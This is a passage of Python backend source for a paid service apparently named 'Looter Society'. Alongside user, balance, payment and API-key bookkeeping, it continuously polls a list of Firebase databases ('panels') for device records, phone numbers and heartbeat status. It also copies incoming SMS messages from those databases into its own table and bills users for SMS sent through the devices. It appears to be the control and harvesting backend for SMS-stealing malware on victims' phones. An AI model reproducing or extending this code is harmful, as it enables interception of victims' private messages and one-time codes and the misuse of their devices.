        row = await conn.fetchrow("SELECT COALESCE(SUM(sms_sent), 0) AS total FROM users")

    return row["total"] if row else 0







# ═══════════════════════════════════════════════════════════════════════════

# WEB CRUD FUNCTIONS

# ═══════════════════════════════════════════════════════════════════════════



# ─── CRUD: Databases (db_)  ───────────────────────────────────────────────



def db_add(url, name):

    did = "db_" + uuid.uuid4().hex[:12]

    pg.execute_write(

        "INSERT INTO databases (id, url, name, added, status) VALUES (%s,%s,%s,%s,%s)",

        (did, url, name, datetime.now().isoformat(), "active"),

    )

    return did





def db_list():

    return pg.execute("SELECT * FROM databases ORDER BY added DESC", dict_cursor=True)





def db_get(did):

    return pg.execute_one("SELECT * FROM databases WHERE id = %s", (did,), dict_cursor=True)





def db_delete(did):

    pg.execute_write("DELETE FROM databases WHERE id = %s", (did,))





def db_delete_many(ids):

    if not ids:

        return 0

    placeholders = ",".join(["%s"] * len(ids))

    pg.execute_write(f"DELETE FROM databases WHERE id IN ({placeholders})", tuple(ids))

    return len(ids)





def db_toggle(did):

    row = db_get(did)

    if not row:

        return False

    new_status = "inactive" if row["status"] == "active" else "active"

    pg.execute_write("UPDATE databases SET status = %s WHERE id = %s", (new_status, did))

    return new_status





def db_all_active():

    return pg.execute("SELECT * FROM databases WHERE status = 'active'", dict_cursor=True)





def db_list_page(page=1, per_page=100, search=""):

    offset = (page - 1) * per_page

    if search:

        rows = pg.execute(

            "SELECT * FROM databases WHERE name ILIKE %s OR url ILIKE %s ORDER BY added DESC LIMIT %s OFFSET %s",

            (f"%{search}%", f"%{search}%", per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute("SELECT * FROM databases ORDER BY added DESC LIMIT %s OFFSET %s", (per_page, offset), dict_cursor=True)

    return rows





def db_total_count(search=""):

    if search:

        row = pg.execute_one("SELECT COUNT(*) as c FROM databases WHERE name ILIKE %s OR url ILIKE %s", (f"%{search}%", f"%{search}%"))

    else:

        row = pg.execute_one("SELECT COUNT(*) as c FROM databases")

    return row[0] if row else 0





def dv_list_page(page=1, per_page=100, search=""):

    offset = (page - 1) * per_page

    if search:

        rows = pg.execute(

            "SELECT * FROM devices WHERE device_id ILIKE %s OR info ILIKE %s ORDER BY last_seen DESC LIMIT %s OFFSET %s",

            (f"%{search}%", f"%{search}%", per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute("SELECT * FROM devices ORDER BY last_seen DESC LIMIT %s OFFSET %s", (per_page, offset), dict_cursor=True)

    return rows





def nm_list_page(page=1, per_page=100, search=""):

    offset = (page - 1) * per_page

    if search:

        rows = pg.execute(

            "SELECT * FROM numbers WHERE number ILIKE %s OR info ILIKE %s ORDER BY last_seen DESC LIMIT %s OFFSET %s",

            (f"%{search}%", f"%{search}%", per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute("SELECT * FROM numbers ORDER BY last_seen DESC LIMIT %s OFFSET %s", (per_page, offset), dict_cursor=True)

    return rows





def log_list_page(page=1, per_page=100, search=""):

    offset = (page - 1) * per_page

    if search:

        rows = pg.execute(

            "SELECT * FROM sms_logs WHERE user_id ILIKE %s OR target ILIKE %s OR panel ILIKE %s ORDER BY created_at DESC LIMIT %s OFFSET %s",

            (f"%{search}%", f"%{search}%", f"%{search}%", per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute("SELECT * FROM sms_logs ORDER BY created_at DESC LIMIT %s OFFSET %s", (per_page, offset), dict_cursor=True)

    return rows





def pay_list_page(page=1, per_page=100, search=""):

    offset = (page - 1) * per_page

    if search:

        rows = pg.execute(

            "SELECT * FROM payments WHERE biz_order_id ILIKE %s OR payer_name ILIKE %s OR payer_vpa ILIKE %s ORDER BY created_at DESC LIMIT %s OFFSET %s",

            (f"%{search}%", f"%{search}%", f"%{search}%", per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT %s OFFSET %s", (per_page, offset), dict_cursor=True)

    return rows





def apikey_list_page(page=1, per_page=100, search=""):

    offset = (page - 1) * per_page

    if search:

        rows = pg.execute(

            "SELECT * FROM api_keys WHERE key ILIKE %s OR user_id ILIKE %s OR name ILIKE %s ORDER BY created_at DESC LIMIT %s OFFSET %s",

            (f"%{search}%", f"%{search}%", f"%{search}%", per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute("SELECT * FROM api_keys ORDER BY created_at DESC LIMIT %s OFFSET %s", (per_page, offset), dict_cursor=True)

    return rows





# ─── CRUD: Users (usr_)  ──────────────────────────────────────────────────



def usr_get(uid):

    return pg.execute_one("SELECT * FROM users WHERE user_id = %s", (uid,), dict_cursor=True)





def usr_list():

    return pg.execute("SELECT * FROM users ORDER BY joined DESC", dict_cursor=True)





def usr_add(uid, balance=0):

    now = datetime.now().isoformat()

    pg.execute_write(

        "INSERT INTO users (user_id, balance, sms_sent, joined, last_active) VALUES (%s,%s,%s,%s,%s) ON CONFLICT (user_id) DO NOTHING",

        (uid, balance, 0, now, now),

    )





def usr_set_balance(uid, bal):

    pg.execute_write("UPDATE users SET balance = %s WHERE user_id = %s", (bal, uid))





def usr_add_balance(uid, amount):
    uid_str = str(uid).strip()
    amt = round(float(amount), 4)
    existing = usr_get(uid_str)
    if not existing:
        usr_add(uid_str, amt)
    else:
        pg.execute_write(
            "UPDATE users SET balance = COALESCE(balance, 0) + %s WHERE user_id = %s",
            (amt, uid_str),
        )
    if rds:
        try:
            rds.delete(f"user:{uid_str}")
        except Exception:
            pass


def usr_deduct_balance(uid, amount):
    uid_str = str(uid).strip()
    amt = round(float(amount), 4)
    if amt <= 0:
        return True
    row = pg.execute_one(
        "UPDATE users SET balance = balance - %s WHERE user_id = %s AND balance >= %s RETURNING balance",
        (amt, uid_str, amt),
        dict_cursor=True
    )
    if not row:
        return False
    if rds:
        try:
            rds.delete(f"user:{uid_str}")
        except Exception:
            pass
    return True





def usr_increment_sms(uid):

    pg.execute_write("UPDATE users SET sms_sent = sms_sent + 1, last_active = %s WHERE user_id = %s", (datetime.now().isoformat(), uid))





def usr_count():

    row = pg.execute_one("SELECT COUNT(*) as c FROM users")

    return row[0] if row else 0





def usr_update(uid, **kwargs):
    uid_str = str(uid).strip()
    sets = []
    vals = []
    for k, v in kwargs.items():
        if k not in _ALLOWED_USER_COLS:
            continue
        sets.append(f"{k} = %s")
        vals.append(v)
    if sets:
        vals.append(uid_str)
        pg.execute_write(f"UPDATE users SET {', '.join(sets)} WHERE user_id = %s", vals)
    if rds:
        try:
            rds.delete(f"user:{uid_str}")
        except Exception:
            pass


def usr_ban(uid, reason=""):
    usr_update(uid, banned=1, ban_reason=reason)


def usr_unban(uid):
    usr_update(uid, banned=0, ban_reason="")


def usr_delete(uid):
    uid_str = str(uid).strip()
    pg.execute_write("DELETE FROM users WHERE user_id = %s", (uid_str,))
    if rds:
        try:
            rds.delete(f"user:{uid_str}")
        except Exception:
            pass
def usr_list_page(page=1, per_page=100, search=""):

    offset = (page - 1) * per_page

    if search:

        rows = pg.execute(

            "SELECT * FROM users WHERE user_id ILIKE %s OR name ILIKE %s OR username ILIKE %s ORDER BY joined DESC LIMIT %s OFFSET %s",

            (f"%{search}%", f"%{search}%", f"%{search}%", per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute(

            "SELECT * FROM users ORDER BY joined DESC LIMIT %s OFFSET %s",

            (per_page, offset), dict_cursor=True

        )

    return rows





def usr_total_count(search=""):

    if search:

        row = pg.execute_one("SELECT COUNT(*) as c FROM users WHERE user_id ILIKE %s OR name ILIKE %s OR username ILIKE %s", (f"%{search}%", f"%{search}%", f"%{search}%"))

    else:

        row = pg.execute_one("SELECT COUNT(*) as c FROM users")

    return row[0] if row else 0





def sms_received_add(from_number="", to_number="", message="", panel="", received_at=None, **kwargs):
    from_str = str(from_number or kwargs.get("from") or kwargs.get("number") or "").strip()
    to_str = str(to_number or kwargs.get("to") or "").strip()
    msg_str = str(message or kwargs.get("message") or kwargs.get("text") or "").strip()
    if not msg_str and from_number and not to_number and not kwargs:
        # fallback if called as sms_received_add(num, msg)
        from_str = str(from_number).strip()
        msg_str = str(to_number).strip()
    if not msg_str:
        return
    panel_str = str(panel or kwargs.get("panel") or "").strip()
    ts = received_at or kwargs.get("received_at") or datetime.now().isoformat()
    try:
        existing = pg.execute_one(
            "SELECT id FROM sms_received WHERE (from_number = %s OR number = %s) AND message = %s LIMIT 1",
            (from_str, from_str, msg_str)
        )
        if existing:
            return
        pg.execute_write(
            "INSERT INTO sms_received (number, from_number, to_number, message, panel, received_at) VALUES (%s,%s,%s,%s,%s,%s)",
            (from_str, from_str, to_str, msg_str, panel_str, str(ts))
        )
    except Exception as e:
        log.warning("sms_received_add error: %s", e)
def sms_received_list(page=1, per_page=100, number=""):

    offset = (page - 1) * per_page

    if number:

        rows = pg.execute(

            "SELECT * FROM sms_received WHERE number = %s ORDER BY received_at DESC LIMIT %s OFFSET %s",

            (number, per_page, offset), dict_cursor=True

        )

    else:

        rows = pg.execute(

            "SELECT * FROM sms_received ORDER BY received_at DESC LIMIT %s OFFSET %s",

            (per_page, offset), dict_cursor=True

        )

    return rows





def sms_received_count(number=""):

    if number:

        row = pg.execute_one("SELECT COUNT(*) as c FROM sms_received WHERE number = %s", (number,))

    else:

        row = pg.execute_one("SELECT COUNT(*) as c FROM sms_received")

    return row[0] if row else 0





def sms_received_numbers():

    return pg.execute("SELECT DISTINCT number, COUNT(*) as cnt FROM sms_received GROUP BY number ORDER BY cnt DESC", dict_cursor=True)





def db_remove_zero_device_panels():

    panels = db_all_active()

    removed = 0

    for panel in panels:

        url = panel["url"].rstrip("/")

        clients = _httpx_fetch_sync(url, "clients.json")

        if not clients or not isinstance(clients, dict) or len(clients) == 0:

            db_delete(panel["id"])

            removed += 1

    return removed





# ─── CRUD: Devices (dv_)  ─────────────────────────────────────────────────



def dv_add(device_id, info=""):

    pg.execute_write(

        "INSERT INTO devices (device_id, info, online, last_seen) VALUES (%s,%s,%s,%s) ON CONFLICT (device_id) DO UPDATE SET info = %s",

        (device_id, info, 0, datetime.now().isoformat(), info),

    )





def dv_list():

    return pg.execute("SELECT * FROM devices ORDER BY last_seen DESC", dict_cursor=True)





def dv_delete(did):

    pg.execute_write("DELETE FROM devices WHERE device_id = %s", (did,))





def dv_count():

    row = pg.execute_one("SELECT COUNT(*) as c FROM devices")

    return row[0] if row else 0





def dv_online_count():

    row = pg.execute_one("SELECT COUNT(*) as c FROM devices WHERE online = 1")

    return row[0] if row else 0





def dv_set_online(did, val):

    pg.execute_write("UPDATE devices SET online = %s, last_seen = %s WHERE device_id = %s", (val, datetime.now().isoformat(), did))





def dv_upsert(device_id, info=""):

    pg.execute_write(

        "INSERT INTO devices (device_id, info, online, last_seen) VALUES (%s,%s,%s,%s) ON CONFLICT (device_id) DO UPDATE SET info = %s, online = 1, last_seen = %s",

        (device_id, info, 1, datetime.now().isoformat(), info, datetime.now().isoformat()),

    )





def dv_set_all_offline():

    pg.execute_write("UPDATE devices SET online = 0")





# ─── CRUD: Numbers (nm_)  ─────────────────────────────────────────────────



def nm_add(number, info=""):

    pg.execute_write(

        "INSERT INTO numbers (number, info, online, last_seen) VALUES (%s,%s,%s,%s) ON CONFLICT (number) DO UPDATE SET info = %s",

        (number, info, 0, datetime.now().isoformat(), info),

    )





def nm_list():

    return pg.execute("SELECT * FROM numbers ORDER BY last_seen DESC", dict_cursor=True)





def nm_delete(number):

    pg.execute_write("DELETE FROM numbers WHERE number = %s", (number,))





def nm_count():

    row = pg.execute_one("SELECT COUNT(*) as c FROM numbers")

    return row[0] if row else 0





def nm_online_count():

    row = pg.execute_one("SELECT COUNT(*) as c FROM numbers WHERE online = 1")

    return row[0] if row else 0





def nm_upsert(number, info=""):

    pg.execute_write(

        "INSERT INTO numbers (number, info, online, last_seen) VALUES (%s,%s,%s,%s) ON CONFLICT (number) DO UPDATE SET info = %s, online = 1, last_seen = %s",

        (number, info, 1, datetime.now().isoformat(), info, datetime.now().isoformat()),

    )





def nm_set_all_offline():

    pg.execute_write("UPDATE numbers SET online = 0")





# ─── CRUD: Payments (pay_)  ───────────────────────────────────────────────



def pay_add(biz_order_id, merchant_trans_id, amount, currency, pay_time, payer_name, payer_vpa, payer_psp, utr=None):
    now = datetime.now().isoformat()
    pg.execute_write(
        """INSERT INTO payments (biz_order_id, merchant_trans_id, amount, currency, pay_time, payer_name, payer_vpa, payer_psp, utr, status, created_at)
        VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,'SUCCESS',%s)
        ON CONFLICT (biz_order_id) DO UPDATE SET utr = COALESCE(EXCLUDED.utr, payments.utr), amount = EXCLUDED.amount""",
        (biz_order_id, merchant_trans_id, amount, currency, pay_time, payer_name, payer_vpa, payer_psp, utr or biz_order_id, now)
    )

def pay_list():
    return pg.execute("SELECT * FROM payments ORDER BY created_at DESC", dict_cursor=True)

def pay_get(utr):
    clean = str(utr).strip()
    row = pg.execute_one("SELECT * FROM payments WHERE biz_order_id = %s OR utr = %s", (clean, clean), dict_cursor=True)
    if row:
        return row
    try:
        live = verify_paytm_payment_live(clean)
        if live and live.get("verified"):
            pay_add(
                biz_order_id=live["biz_order_id"],
                merchant_trans_id=live.get("merchant_trans_id", ""),
                amount=live["amount"],
                currency="INR",
                pay_time=live.get("pay_time", ""),
                payer_name=live.get("payer_name", ""),
                payer_vpa=live.get("payer_vpa", ""),
                payer_psp=live.get("payer_psp", ""),
                utr=live.get("utr", clean)
            )
            return pg.execute_one("SELECT * FROM payments WHERE biz_order_id = %s OR utr = %s", (clean, clean), dict_cursor=True)
    except Exception as e:
        log.error("pay_get live error: %s", e)
    return None

def pay_total():
    row = pg.execute_one("SELECT COALESCE(SUM(amount),0) as total FROM payments")
    return row[0] if row else 0

def pay_claim(utr, user_id):
    now = datetime.now().isoformat()
    clean = str(utr).strip()
    row = pg.execute_one("SELECT claimed_by, amount FROM payments WHERE biz_order_id = %s OR utr = %s", (clean, clean), dict_cursor=True)
    if not row:
        return False, "UTR not found"
    if row.get("claimed_by"):
        return False, "UTR already used"
    pg.execute_write(
        "UPDATE payments SET claimed_by = %s, claimed_at = %s WHERE (biz_order_id = %s OR utr = %s) AND claimed_by IS NULL",
        (str(user_id), now, clean, clean)
    )
    check = pg.execute_one("SELECT claimed_by FROM payments WHERE biz_order_id = %s OR utr = %s", (clean, clean), dict_cursor=True)
    if check and str(check.get("claimed_by")) == str(user_id):
        return True, "success"
    return False, "UTR already used" 





def generate_upi_qr(amount, vpa=None, name="Looter Society"):

    import qrcode

    import io

    if not vpa:

        vpa = setting_get("paytm_vpa") or "paytm.s2fqznb@pty"

    upi_link = f"upi://pay?pa={vpa}&pn={name}&am={amount:.2f}&cu=INR"

    qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=10, border=4)

    qr.add_data(upi_link)

    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")

    buf = io.BytesIO()

    img.save(buf, format="PNG")

    buf.seek(0)

    return buf





# ─── CRUD: Settings  ──────────────────────────────────────────────────────



def setting_get(key):

    row = pg.execute_one("SELECT value FROM settings WHERE key = %s", (key,))

    return row[0] if row else ""





def setting_set(key, value):
    global settings_cache, SMS_COST
    val_str = str(value) if value is not None else ""
    pg.execute_write(
        "INSERT INTO settings (key, value) VALUES (%s,%s) ON CONFLICT (key) DO UPDATE SET value = %s",
        (key, val_str, val_str),
    )
    settings_cache[key] = val_str
    if key == "sms_cost":
        try:
            SMS_COST = float(val_str)
        except Exception:
            pass
def setting_all():

    rows = pg.execute("SELECT * FROM settings ORDER BY key", dict_cursor=True)

    return {r["key"]: r["value"] for r in rows}





# ─── CRUD: SMS Logs  ──────────────────────────────────────────────────────



def log_add(user_id, target, panel, status, message=""):

    now = datetime.now().isoformat()

    pg.execute_write(

        "INSERT INTO sms_logs (user_id, target, panel, status, message, created_at) VALUES (%s,%s,%s,%s,%s,%s)",

        (user_id, target, panel, status, message, now),

    )





def log_list(limit=100, offset=0):

    return pg.execute(

        "SELECT * FROM sms_logs ORDER BY created_at DESC LIMIT %s OFFSET %s",

        (limit, offset),

        dict_cursor=True,

    )





def log_count():

    row = pg.execute_one("SELECT COUNT(*) as c FROM sms_logs")

    return row[0] if row else 0





def log_total_sms():

    row = pg.execute_one("SELECT COALESCE(SUM(sms_sent),0) as total FROM users")

    return row[0] if row else 0





# ─── CRUD: API Keys  ──────────────────────────────────────────────────────



def apikey_add(user_id, name):

    key = "ak_" + uuid.uuid4().hex

    now = datetime.now().isoformat()

    pg.execute_write(

        "INSERT INTO api_keys (key, user_id, name, active, created_at) VALUES (%s,%s,%s,%s,%s)",

        (key, user_id, name, 1, now),

    )

    return key





def apikey_list():

    return pg.execute("SELECT * FROM api_keys ORDER BY created_at DESC", dict_cursor=True)





def apikey_validate(key):

    row = pg.execute_one("SELECT * FROM api_keys WHERE key = %s AND active = 1", (key,), dict_cursor=True)

    return row





def apikey_delete(key):

    pg.execute_write("DELETE FROM api_keys WHERE key = %s", (key,))





def apikey_count():

    row = pg.execute_one("SELECT COUNT(*) as c FROM api_keys")

    return row[0] if row else 0







# ═══════════════════════════════════════════════════════════════════════════

# WEB PROBE

# ═══════════════════════════════════════════════════════════════════════════



# ─── Firebase Probe  ──────────────────────────────────────────────────────



def normalize_firebase_url(url):

    """Centralized Firebase RTDB URL normalization. Handles all formats:

    - https://name-default-rtdb.firebaseio.com

    - https://name-default-rtdb.firebasedatabase.app

    - With/without ?auth=API_KEY (KEPT - required for Firebase auth)

    - With/without trailing slash

    - With/without https:// prefix

    Returns (normalized_url, name) or (None, None) if invalid.

    """

    if not url or not isinstance(url, str):

        return None, None

    url = url.strip()

    if not url:

        return None, None

    if not url.startswith("http://") and not url.startswith("https://"):

        url = "https://" + url

    try:

        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)

    except Exception:

        return None, None

    host = (parsed.hostname or "").lower()

    if not host:

        return None, None

    is_firebaseio = host.endswith(".firebaseio.com") or host == "firebaseio.com"

    is_firebasedb = host.endswith(".firebasedatabase.app")

    if not is_firebaseio and not is_firebasedb:

        return None, None

    # Reconstruct URL: scheme + host, preserving query params (auth key!)

    query = parsed.query or ""

    if query:

        normalized = f"https://{host}?{query}"

    else:

        normalized = f"https://{host}"

    # Derive name from host

    if is_firebaseio:

        name = host.replace(".firebaseio.com", "")

    else:

        parts = host.replace(".firebasedatabase.app", "").split(".")

        name = parts[0] if parts else host

    # Clean name: remove -default-rtdb suffix if present for consistency

    clean_name = name

    if clean_name.endswith("-default-rtdb"):

        clean_name = clean_name[:-len("-default-rtdb")]

    return normalized, clean_name





def _firebase_url(base_url, path=""):

    """Build a Firebase REST API URL correctly.

    Puts .json BEFORE any ?auth= query param.

    Example:

      base="https://x.firebaseio.com?auth=KEY", path="clients/123/webhookEvent/sendSms"

      -> "https://x.firebaseio.com/clients/123/webhookEvent/sendSms.json?auth=KEY"

    """

    base = base_url.rstrip("/")

    if "?" in base:

        base_clean, query = base.split("?", 1)

        if path:

            return f"{base_clean}/{path}.json?{query}"

        return f"{base_clean}.json?{query}"

    if path:

        return f"{base}/{path}.json"

    return f"{base}.json"





def _firebase_get(url, timeout=20):

    try:

        req = urllib.request.Request(url, headers={"Accept": "application/json"})

        with urllib.request.urlopen(req, timeout=timeout) as resp:

            data = resp.read().decode("utf-8")

            return json.loads(data)

    except urllib.error.HTTPError as e:

        log.debug("Firebase GET %s -> HTTP %s", url.split("?")[0], e.code)

        return None

    except Exception as e:

        log.debug("Firebase GET %s -> %s", url.split("?")[0], str(e)[:80])

        return None





# ==================== HTTPX ASYNC ENGINE (from web_ui.py) ====================



_HTTPX_LOOP = None

_HTTPX_READY = False



def _start_httpx_loop():

    global _HTTPX_CLIENT, _HTTPX_LOOP, _HTTPX_READY

    _HTTPX_LOOP = asyncio.new_event_loop()

    asyncio.set_event_loop(_HTTPX_LOOP)

    _HTTPX_CLIENT = httpx.AsyncClient(

        limits=httpx.Limits(max_connections=300, max_keepalive_connections=300),

        verify=False,

        timeout=httpx.Timeout(20.0, connect=10.0, pool=60.0),

    )

    _HTTPX_READY = True

    _HTTPX_LOOP.run_forever()





def _httpx_fetch_sync(fb_url, node, timeout=20):

    """Synchronous wrapper to fetch from Firebase using httpx event loop."""

    if not _ensure_httpx_loop():

        return _firebase_get(_firebase_url(fb_url, node), timeout=timeout)

    future = asyncio.run_coroutine_threadsafe(

        _httpx_fetch_async(fb_url, node, timeout), _HTTPX_LOOP

    )

    return future.result(timeout=timeout + 30)





async def _httpx_fetch_async(fb_url, node, timeout=20):

    """Async fetch from Firebase using httpx with cache buster."""

    if not _HTTPX_CLIENT or not fb_url:

        return {}

    clean_node = node.lstrip("/")

    if not clean_node.endswith(".json"):

        clean_node += ".json"

    url = f"{fb_url.rstrip('/')}/{clean_node}?_cb={int(time.time() * 1000)}"

    try:

        resp = await _HTTPX_CLIENT.get(url, timeout=httpx.Timeout(float(timeout), connect=10.0, pool=60.0))

        if resp.status_code == 200:

            return resp.json()

        return {}

    except Exception:

        return {}





def _httpx_fetch_multi_async(fb_url, nodes, timeout=15):

    """Fetch multiple nodes from the same Firebase endpoint concurrently."""

    async def one(node):

        return node, await _httpx_fetch_async(fb_url, node, timeout)

    async def all_nodes():

        tasks = [one(n) for n in nodes]

        return await asyncio.gather(*tasks)

    if not _ensure_httpx_loop():

        return {}

    future = asyncio.run_coroutine_threadsafe(all_nodes(), _HTTPX_LOOP)

    results = future.result(timeout=timeout + 30)

    merged = {}

    for node_name, data in results:

        if isinstance(data, dict):

            for k, v in data.items():

                if k not in merged:

                    merged[k] = v

    return merged





def _deep_find_keys(obj, keywords, prefix=""):

    results = []

    if isinstance(obj, dict):

        for k, v in obj.items():

            full_key = f"{prefix}/{k}" if prefix else k

            if any(kw in k.lower() for kw in keywords):

                results.append({"key": full_key, "value": v})

            results.extend(_deep_find_keys(v, keywords, full_key))

    elif isinstance(obj, list):

        for i, item in enumerate(obj):

            results.extend(_deep_find_keys(item, keywords, f"{prefix}[{i}]"))

    return results





def _extract_device_number(cdata):

    if not isinstance(cdata, dict):

        return ""

    direct = cdata.get("mobNo") or cdata.get("mobile") or cdata.get("num") or cdata.get("number") or cdata.get("phone") or cdata.get("phoneNumber")

    if direct and str(direct).strip():

        return str(direct).strip()

    for subkey in ("sendSms", "send_sms", "sms", "command", "smsCommand"):

        sub = cdata.get(subkey)

        if isinstance(sub, dict):

            val = sub.get("mobNo") or sub.get("mobile") or sub.get("num") or sub.get("number") or sub.get("phone") or sub.get("phoneNumber")

            if val and str(val).strip():

                return str(val).strip()

    sims = cdata.get("sims")

    if isinstance(sims, list):

        for s in sims:

            if isinstance(s, dict):

                val = s.get("number") or s.get("phone") or s.get("mobNo")

                if val and str(val).strip():

                    return str(val).strip()

    return ""





# ==================== HTTPX POOLED CLIENT (async event loop in background thread) ====================



_HTTPX_CLIENT = None

_HTTPX_LOOP = None

_HTTPX_LOOP_STARTED = False

_HTTPX_LOOP_LOCK = threading.Lock()





def _ensure_httpx_loop():

    global _HTTPX_CLIENT, _HTTPX_LOOP, _HTTPX_LOOP_STARTED

    if _HTTPX_LOOP_STARTED:

        return True

    with _HTTPX_LOOP_LOCK:

        if _HTTPX_LOOP_STARTED:

            return True

        def _start():

            global _HTTPX_CLIENT, _HTTPX_LOOP, _HTTPX_LOOP_STARTED

            _HTTPX_LOOP = asyncio.new_event_loop()

            asyncio.set_event_loop(_HTTPX_LOOP)

            _HTTPX_CLIENT = httpx.AsyncClient(

                limits=httpx.Limits(max_connections=200, max_keepalive_connections=200),

                verify=False,

                timeout=httpx.Timeout(20.0, connect=10.0),

                follow_redirects=True,

            )

            _HTTPX_LOOP_STARTED = True

            _HTTPX_LOOP.run_forever()

        threading.Thread(target=_start, daemon=True).start()

    for _ in range(100):

        if _HTTPX_LOOP_STARTED and _HTTPX_CLIENT:

            return True

        time.sleep(0.1)

    return bool(_HTTPX_LOOP_STARTED)





def _httpx_fetch(url, timeout_s=15):

    """Sync wrapper: fetch a URL using the pooled async httpx client."""

    if not _ensure_httpx_loop():

        return _firebase_get(url, timeout=int(timeout_s))

    async def _do():

        return await _HTTPX_CLIENT.get(url, timeout=httpx.Timeout(float(timeout_s), connect=10.0))

    try:

        future = asyncio.run_coroutine_threadsafe(_do(), _HTTPX_LOOP)

        resp = future.result(timeout=timeout_s + 30)

        if resp.status_code == 200:

            return resp.json()

        return None

    except Exception:

        return None





async def _httpx_fetch_many_async(requests_list):

    """Fetch many URLs concurrently using the pooled async client."""

    async def one(url):

        try:

            resp = await _HTTPX_CLIENT.get(url, timeout=httpx.Timeout(15.0, connect=10.0))

            if resp.status_code == 200:

                return url, resp.json()

        except Exception:

            pass

        return url, None

    tasks = [one(u) for u in requests_list]

    return await asyncio.gather(*tasks)





async def _probe_panel_async(panel):

    """Async probe of a single panel - runs inside httpx event loop."""

    cb = int(time.time() * 1000)

    url = panel["url"]

    base = url.rstrip("/")



    # Build URL correctly: .json BEFORE any ─auth= param

    if "?" in base:

        base_clean, query = base.split("?", 1)

        clients_url = f"{base_clean}/clients.json?{query}&_cb={cb}"

    else:

        clients_url = f"{base}/clients.json?_cb={cb}"



    clients = None

    for attempt in range(2):

        timeout_s = 10.0 if attempt == 0 else 20.0

        try:

            r = await _HTTPX_CLIENT.get(clients_url, timeout=httpx.Timeout(timeout_s, connect=8.0))

            if r.status_code == 200:

                data = r.json()

                if isinstance(data, dict) and data:

                    clients = data

                    break

        except Exception:

            pass



    if not clients:

        for alt in ("devices", "registeredDevices", "users", "user_data", "All_Users"):

            if "?" in base:

                alt_url = f"{base_clean}/{alt}.json?{query}&_cb={cb}"

            else:

                alt_url = f"{base}/{alt}.json?_cb={cb}"

            try:

                r = await _HTTPX_CLIENT.get(alt_url, timeout=httpx.Timeout(8.0, connect=8.0))

                if r.status_code == 200:

                    alt_data = r.json()

                    if isinstance(alt_data, dict) and alt_data:

                        if not clients:

                            clients = {}

                        for k, v in alt_data.items():

                            if isinstance(v, dict) and k not in clients:

                                clients[k] = v

            except Exception:

                pass

    return panel, clients





async def _probe_all_async(panels):

    """Probe all panels in batches of 10 with cooldowns to avoid Firebase 423."""

    BATCH_SIZE = 10

    DELAY_BETWEEN_BATCHES = 3.0

    sem = asyncio.Semaphore(10)



    async def limited_probe(panel):

        async with sem:

            return await _probe_panel_async(panel)



    all_results = []

    total_batches = (len(panels) + BATCH_SIZE - 1) // BATCH_SIZE

    for i in range(0, len(panels), BATCH_SIZE):

        batch = panels[i:i+BATCH_SIZE]

        batch_num = i // BATCH_SIZE + 1

        log.info("Probing batch %d/%d (%d panels)", batch_num, total_batches, len(batch))

        tasks = [limited_probe(p) for p in batch]

        batch_results = await asyncio.gather(*tasks, return_exceptions=True)

        all_results.extend(batch_results)

        if i + BATCH_SIZE < len(panels):

            await asyncio.sleep(DELAY_BETWEEN_BATCHES)

    return all_results






def sync_incoming_sms_from_panels():
    """Background worker: pulls recent incoming SMS from active Firebase panels into sms_received table."""
    try:
        panels = db_all_active()
        if not panels:
            return
        
        for panel in panels:
            base = panel.get("url", "").rstrip("/")
            if not base:
                continue
            panel_name = panel.get("name", "")
            
            # Check /messages.json and /sms.json
            for node in ["messages", "sms"]:
                try:
                    url = _firebase_url(base, node)
                    if "?" in url:
                        url += '&orderBy="$key"&limitToLast=15'
                    else:
                        url += '?orderBy="$key"&limitToLast=15'
                    req = urllib.request.Request(url, headers={"Accept": "application/json", "User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=4) as resp:
                        data = json.loads(resp.read().decode())
                        if not data or not isinstance(data, dict):
                            continue
                        for mid, mdata in data.items():
                            if isinstance(mdata, dict):
                                sender = (mdata.get("sender") or mdata.get("from") or mdata.get("number") or 
                                          mdata.get("address") or mdata.get("phone") or mdata.get("mobile") or "")
                                msg = (mdata.get("message") or mdata.get("body") or mdata.get("msg") or 
                                       mdata.get("text") or mdata.get("messageText") or "")
                                to_num = mdata.get("to") or mdata.get("receiver") or mdata.get("sim") or ""
                                rcv_time = mdata.get("date") or mdata.get("dateTime") or mdata.get("timestamp") or mdata.get("time")
                                if sender and msg:
                                    sms_received_add(from_number=sender, to_number=to_num, message=msg, panel=panel_name, received_at=rcv_time)
                except Exception:
                    pass
    except Exception as e:
        log.warning("sync_incoming_sms_from_panels error: %s", e)

def _background_probe_loop():
    """Continuously probe all panels in background and sync incoming SMS."""
    import time as _time
    while True:
        try:
            _run_background_probe()
            sync_incoming_sms_from_panels()
        except Exception as e:
            log.warning("Background probe/sms loop error: %s", e)
        _time.sleep(25)





def _run_background_probe():

    if LIVE_CACHE["probe_running"]:

        return

    LIVE_CACHE["probe_running"] = True

    try:

        panels = db_all_active()

        total_panels = len(panels)

        if total_panels == 0:

            LIVE_CACHE["probe_running"] = False

            return



        if not _ensure_httpx_loop():

            log.warning("httpx loop not available, falling back to sync probe")

            _run_background_probe_sync(panels)

            return



        log.info("Async probe starting: %d panels", total_panels)

        future = asyncio.run_coroutine_threadsafe(_probe_all_async(panels), _HTTPX_LOOP)

        results = future.result(timeout=700)



        all_devices = []

        working = 0

        total_devices = 0

        total_online = 0

        total_numbers = 0

        total_online_numbers = 0

        failed = 0



        for result in results:

            if isinstance(result, Exception):

                failed += 1

                continue

            panel, clients = result

            if not clients or not isinstance(clients, dict):

                failed += 1

                continue

            working += 1

            for cid, cdata in clients.items():

                if not isinstance(cdata, dict):

                    continue

                total_devices += 1

                raw_status = cdata.get("status")

                hb_val = (
                    cdata.get("heartbeat", {}).get("timestamp") if isinstance(cdata.get("heartbeat"), dict)
                    else cdata.get("webhookEvent", {}).get("dozeHeartbeat") if isinstance(cdata.get("webhookEvent"), dict)
                    else None
                )
                raw_last_seen = (
